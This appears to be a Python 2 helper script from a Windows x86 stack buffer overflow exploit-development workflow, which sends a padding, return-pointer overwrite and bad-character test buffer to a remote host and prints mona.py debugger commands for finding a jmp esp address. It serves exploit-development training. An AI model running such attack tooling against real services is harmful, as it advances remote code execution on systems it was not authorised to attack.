#!/usr/bin/env python

# Used to test bad characters as part of the process in developing a
# Windows x86 reverse shell stack buffer overflow
# Saved Return Pointer overwrite exploit.
# Parameters are saved in params.py for persistence.
# Delete params.py and params.pyc to reset them; or simply edit params.py
#
# Written by y0k3L
# Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
# https://github.com/justinsteven/dostackbufferoverflowgood

import functions, argparse

# get parameters
RHOST = functions.getRhost()
RPORT = functions.getRport()
buf_totlen = functions.getBufTotlen()
offset_srp = functions.getOffsetSrp()

print "RHOST=%s; RPORT=%s; buf_totlen=%s; offset_srp=%s" % (RHOST, RPORT, buf_totlen, offset_srp)

parser = argparse.ArgumentParser()
parser.add_argument("-b", help="Bad characters in hex format, no spaces, eg. 0x0A,0x7B", dest='additional_bchars', nargs='+')

args = parser.parse_args()

print "Additional bad chars =", str(args.additional_bchars)

badchar_test = ""       # start with an empty string
badchars = [0x00, 0x0A] # we've reasoned that these are definitely bad

if args.additional_bchars is not None:

    extras = args.additional_bchars[0].split(",")   # split out by comma delimeter

    for i in range(0, len(extras)):
        extras[i] = int(extras[i], 16)  # convert from str to hex int
        badchars.append(extras[i])      # append bad char to badchars list

    # remove any duplicates
    badchars = list(dict.fromkeys(badchars))

print "badchars =", [hex(x) for x in badchars]

# generate the string
for i in range(0x00, 0xFF+1):   # range(0x00, 0xFF) only returns up to 0xFE
    if i not in badchars:       # skip the badchars
        badchar_test += chr(i)  # append each non-badchar to the string

try:
    # open a file for writing ("w") the string as binary ("b") data
    with open("badchar_test.bin", "wb") as f:
        f.write(badchar_test)
except:
    print "Error when writing to file. Quitting..."
    quit()

buf = ""
buf += "A" * (offset_srp - len(buf))    # padding
buf += "BBBB"                           # SRP overwrite
buf += badchar_test                     # ESP points here
buf += "D" * (buf_totlen - len(buf))    # trailing padding
buf += "\n"

# print buf

sent = functions.sendBuffer(RHOST, RPORT, buf)

if sent is 0:
    print "\nSet up mona byte array as follows:"
    print "!mona bytearray -cpb \"\\x00\\x0a<other bad chars>\"\n"
    print "Use \"!mona cmp -a esp -f C:\\path\\bytearray.bin\" to check bad chars."
    print "Then run \"!mona jmp -r esp -cpb \"\\x00\\x0a<other bad chars>\" to search for \"jmp esp\" memory addresses."
    print "\nAlso try \"!mona modules\" to find an unprotected module, followed by"
    print "\"!mona find -s \"\\xff\\xe4\" -cpb \"\\x00\\x0a<other bad chars>\" -m <module_name>\""
    print "\nEnter discovered jmp esp (or \\xff\\xe4) memory address at next step."
